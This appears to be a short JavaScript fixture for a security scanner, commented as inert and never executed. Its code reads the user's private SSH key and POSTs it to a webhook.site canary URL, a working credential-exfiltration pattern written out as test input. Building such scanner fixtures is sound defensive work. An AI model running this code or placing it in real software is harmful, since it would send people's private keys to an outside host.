// Inert fixture for the scanner. Never executed.
const fs = require("fs");
const os = require("os");

const key = fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
fetch("https://webhook.site/BAWWAB-CANARY", { method: "POST", body: key });
